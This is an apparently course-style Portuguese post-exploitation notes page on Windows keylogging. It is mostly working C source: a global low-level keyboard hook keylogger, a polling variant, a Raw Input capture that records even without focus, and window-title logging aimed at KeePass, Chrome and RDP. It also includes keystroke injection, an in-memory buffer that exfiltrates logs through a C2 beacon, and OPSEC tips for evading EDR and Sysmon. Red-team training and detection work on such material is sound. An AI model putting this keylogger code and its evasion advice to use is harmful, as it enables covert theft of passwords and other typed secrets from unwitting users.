---
layout: cyber
section: pos-expl-windows
title: "Keylogging"
---

# 08. Keylogging

## Senhas em Campos Mascarados

Capturas de tela mostram o que está visível; keylogger captura o que o usuário digita — senhas em campos mascarados (`*****`), comandos, chat, credenciais de VPN. É complemento direto a screenshots pois captura dados antes de aparecerem na tela. Em operações de longa duração, um keylogger em background coleta credenciais novas à medida que o usuário as utiliza, cobrindo janelas que dump de LSASS não captura.

---

## Três Abordagens

| Técnica | Scope | Privilégio | Detecção |
|---------|-------|-----------|---------|
| `SetWindowsHookEx(WH_KEYBOARD_LL)` | Sistema inteiro | User-mode (sem admin) | Alta — hook global listado em PEB/API |
| `GetAsyncKeyState` polling | Sistema inteiro | User-mode | Média — polling loop |
| Raw Input API | Janela atual do processo | User-mode | Baixa |

---

## Na Prática

### 1. SetWindowsHookEx — Low-Level Keyboard Hook

Hook de baixo nível intercepta todas as keystrokes **antes** de chegarem à janela alvo. Funciona mesmo sem foco.

```c
#include <windows.h>
#include <stdio.h>

static HHOOK g_hHook = NULL;
static FILE* g_pLog = NULL;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        PKBDLLHOOKSTRUCT pKb = (PKBDLLHOOKSTRUCT)lParam;

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            // Converter VK para char
            BYTE kbState[256];
            GetKeyboardState(kbState);
            WCHAR szChar[5] = { 0 };
            int res = ToUnicodeEx(pKb->vkCode, pKb->scanCode, kbState,
                                  szChar, 4, 0, GetKeyboardLayout(0));

            if (res > 0) {
                // Char imprimível
                wprintf(L"%s", szChar);
                if (g_pLog) fwprintf(g_pLog, L"%s", szChar);
            } else {
                // Tecla especial: Enter, Tab, BackSpace...
                switch (pKb->vkCode) {
                    case VK_RETURN:  wprintf(L"\n"); break;
                    case VK_BACK:    wprintf(L"[BS]"); break;
                    case VK_TAB:     wprintf(L"[TAB]"); break;
                    case VK_SHIFT:   break;
                    case VK_CONTROL: break;
                    default:         wprintf(L"[VK:%02X]", pKb->vkCode);
                }
            }
            fflush(stdout);
        }
    }
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

int main() {
    g_hHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (!g_hHook) { printf("[!] Hook failed: %d\n", GetLastError()); return 1; }

    printf("[*] Keylogger active. Press Ctrl+C to stop.\n");

    // Message pump (necessário para WH_KEYBOARD_LL)
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(g_hHook);
    return 0;
}
```

**Importante**: `WH_KEYBOARD_LL` requer message loop ativo na thread que instalou o hook. Sem `GetMessage`, hook não dispara.

### 2. Context-Aware Logging — Janela Ativa

Enriquecer com título da janela onde keystroke foi digitado:

```c
// Dentro do hook, identificar janela ativa
HWND hFgWnd = GetForegroundWindow();
WCHAR szTitle[256];
GetWindowTextW(hFgWnd, szTitle, 256);

// Log com contexto
wprintf(L"\n[Window: %s]\n", szTitle);
```

Resultado: keylog associado a aplicação específica — filtrar entradas em `KeePass`, `Google Chrome`, `mstsc` (RDP), etc.

### 3. GetAsyncKeyState Polling

Alternativa mais simples, sem hook registrado:

```c
void KeyloggerPoll() {
    SHORT prevState[256] = { 0 };

    while (TRUE) {
        for (int vk = 0x08; vk <= 0xFE; vk++) {
            SHORT cur = GetAsyncKeyState(vk);
            if ((cur & 0x8001) && !(prevState[vk] & 0x8001)) {
                // Tecla pressionada agora e não estava antes
                BYTE kbState[256];
                GetKeyboardState(kbState);
                WCHAR ch[4] = { 0 };
                if (ToUnicodeEx(vk, MapVirtualKey(vk, MAPVK_VK_TO_VSC),
                                kbState, ch, 3, 0, GetKeyboardLayout(0)) > 0) {
                    wprintf(L"%s", ch);
                }
            }
            prevState[vk] = cur;
        }
        Sleep(10);  // 10ms poll ~100Hz
    }
}
```

Sem `SetWindowsHookEx` na API trace → menos visível. Porém loop `GetAsyncKeyState` de 256 VKs a 100Hz consome CPU e pode ser detectado por heurística de "input polling".

### 4. Raw Input API

Registrar janela para receber `WM_INPUT` de teclado sem hook global:

```c
RAWINPUTDEVICE rid;
rid.usUsagePage = 0x01;  // Generic Desktop Controls
rid.usUsage     = 0x06;  // Keyboard
rid.dwFlags     = RIDEV_INPUTSINK;  // Receber mesmo sem foco
rid.hwndTarget  = hMyWindow;
RegisterRawInputDevices(&rid, 1, sizeof(rid));

// No WndProc:
case WM_INPUT: {
    UINT sz = 0;
    GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &sz, sizeof(RAWINPUTHEADER));
    RAWINPUT* ri = (RAWINPUT*)malloc(sz);
    GetRawInputData((HRAWINPUT)lParam, RID_INPUT, ri, &sz, sizeof(RAWINPUTHEADER));

    if (ri->header.dwType == RIM_TYPEKEYBOARD) {
        RAWKEYBOARD* pk = &ri->data.keyboard;
        if (pk->Flags & RI_KEY_BREAK) { free(ri); break; }  // Key up

        BYTE kbState[256];
        GetKeyboardState(kbState);
        WCHAR ch[4] = { 0 };
        ToUnicodeEx(pk->VKey, pk->MakeCode, kbState, ch, 3, 0,
                    GetKeyboardLayout(0));
        wprintf(L"%s", ch);
    }
    free(ri);
    break;
}
```

`RIDEV_INPUTSINK` = receber mesmo sem foco na janela. Mais furtivo que hook global.

---

## Keystrokes para Processos Remotos

Simular entrada em processo remoto (ex: desbloquear sessão, preencher formulário):

```c
// SendInput — injetar keystroke no sistema
INPUT inp = { 0 };
inp.type = INPUT_KEYBOARD;
inp.ki.wVk = 'A';
inp.ki.dwFlags = 0;            // key down
SendInput(1, &inp, sizeof(INPUT));

inp.ki.dwFlags = KEYEVENTF_KEYUP;
SendInput(1, &inp, sizeof(INPUT));
```

`PostMessage(hWnd, WM_KEYDOWN, vk, lparam)` para janela específica (sem focus roubado):

```c
// 'a' → VK=0x41, scancode via MapVirtualKey
WPARAM vk = 0x41;
LPARAM lp = (1 << 0)                    // repeat count=1
          | (MapVirtualKey(vk, 0) << 16); // scan code
PostMessageW(hTarget, WM_KEYDOWN, vk, lp);
Sleep(10);
PostMessageW(hTarget, WM_CHAR, 'a', lp);
PostMessageW(hTarget, WM_KEYUP, vk, lp | (1 << 30) | (1 << 31));
```

Útil para automatizar entrada em apps sem interface headless.

---

## Persistência do Log em Memória

Para evitar arquivo em disco, acumular em buffer circular heap:

```c
typedef struct { WCHAR* pBuf; DWORD dwCap; DWORD dwLen; } KeyBuf;

KeyBuf g_buf = { NULL, 4096, 0 };

void AppendKey(LPCWSTR pStr) {
    if (!g_buf.pBuf) g_buf.pBuf = (WCHAR*)VirtualAlloc(NULL, g_buf.dwCap * 2,
                                                         MEM_COMMIT, PAGE_READWRITE);
    DWORD len = (DWORD)wcslen(pStr);
    if (g_buf.dwLen + len >= g_buf.dwCap) {
        // Exfil e resetar
        ExfilKeylog(g_buf.pBuf, g_buf.dwLen);
        g_buf.dwLen = 0;
    }
    wcsncpy(g_buf.pBuf + g_buf.dwLen, pStr, len);
    g_buf.dwLen += len;
}
```

Exfil periódica via C2 beacon + flush = log nunca em disco.

---

## OPSEC

- `SetWindowsHookEx(WH_KEYBOARD_LL)` listado em `EnumWindows`/`FindWindow` indiretamente; Sysmon Event 13 pode capturar via API.
- EDRs monitoram `SetWindowsHookEx` com `WH_KEYBOARD_LL` ou `WH_KEYBOARD`.
- Alternativa furtiva: captura via **accessibility API** (`SetWinEventHook(EVENT_OBJECT_FOCUS, ...)`) — menos monitorada.
- **GetAsyncKeyState** polling: sem hook registrado mas consome CPU detectável.
- **In-process only**: Raw Input API sem `RIDEV_INPUTSINK` só captura quando janela ativa → menos detecção mas menos cobertura.

## Módulos Relacionados

`07_in_memory_capture.md` cobre screenshots e clipboard — técnicas complementares que capturam o que está visível enquanto o keylogger captura o que é digitado. `03_credenciais_windows.md` cobre dump de LSASS e SAM para credenciais já armazenadas em disco. ATT&CK T1056.001 (Keylogging) mapeia as técnicas desta nota.
